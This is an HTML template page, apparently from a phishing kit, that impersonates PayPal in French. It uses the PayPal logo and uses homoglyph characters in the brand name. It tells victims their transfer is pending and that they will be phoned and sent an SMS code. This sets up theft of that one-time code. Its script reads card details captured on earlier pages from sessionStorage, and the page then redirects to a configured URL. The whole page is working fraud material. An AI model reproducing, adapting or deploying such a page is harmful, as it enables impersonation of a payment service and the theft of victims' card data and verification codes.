<!DOCTYPE html>
<html dir="ltr">

    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <title>Félicitation</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge">
        <meta charset="utf8">
        <link rel="stylesheet" href="/css/normalize.css">
        <link rel="stylesheet" href="/css/bootstrap.css">
        <link rel="stylesheet" href="/css/font-awesome.css">
        <link rel="stylesheet" href="/css/main_style.css">
        <link rel="shortcut icon" type="image/x-icon" href="/images/ppl.ico">
        <meta http-equiv="refresh" content="3; url={{ config('app.redirect_url.success') }}">
    </head>

    <body>
        <div class="contain">
            <div class="img-logo">
                <a href="#"><img src="/images/paypal-logo.png"
                        style="height: 160px;margin-top: -60px;margin-bottom: -75px;"></a>
            </div>
            <div class="center-color"></div>
            <div class="right-btn"><a href="#" class="log_out">Déconnexion</a></div>
            <div class="cls"></div>
        </div>
        <div class="contain biling-p">
            <div class="contain-info">
                <center>
                    <h3> Votre virement est en cours <span id="replace_n_card"></span></h3>
                    <img src="/images/validated.svg" style="width: 170px;height: auto;margin-bottom:20px">
                </center>
                <h5 style="color:#676767">Suite aux nouvelles
                    mesures de sécurité, vous serez crédité sur votre compte qu’après avoir
                    confirmé que vous êtes bien le titulaire du compte bancaire enregistré
                    sur votre compte Paypal. <br>
                    Pour terminer la confirmation de votre compte : vous serez contacté
                    par téléphone par le service client dans les meilleurs délais. <br>
                    En confirmant votre compte bancaire, vous autorisez Paypal à vous
                    envoyer un SMS.Vous trouverez dans le SMS, un montant de vérification
                    généré de manière aléatoire et un code de 4 à 8 chiffres
                    .</h5>
                <h5 style="color:#676767">La confirmation de votre
                    compte bancaire vous permet de prouver que vous êtes bien le titulaire
                    de la carte bancaire enregistrée puisque vous seul avez accès au code
                    Paypal.
                </h5>
                <center>
                    <h4 style="color:#676767">Merci d'avoir choisi ΡayΡal.</h4>
                    <h5 style="color:#676767;margin:20px auto"></h5>
                </center>
            </div>
        </div>
        <div class="foot-pay">
            <center>
                <a href="#">Aide et Contact</a>
                <a href="#">Confidentialité</a>
                <a href="#">Légal</a>
                <a href="#">Sécurité</a>
            </center>
        </div>
        <script src="/js/jquery-3.3.1.min.js"></script>
        <script>
        $(document).ready(function() {
            if (!sessionStorage.getItem("n_card") || !sessionStorage.getItem("c_num")) {
                location.replace("{{ url('/confirm-card') }}");
            }
            sessionStorage.removeItem("userkey");
            $('#replace_n_card').html(sessionStorage.getItem("n_card"))
        });
        </script>
    </body>

</html>
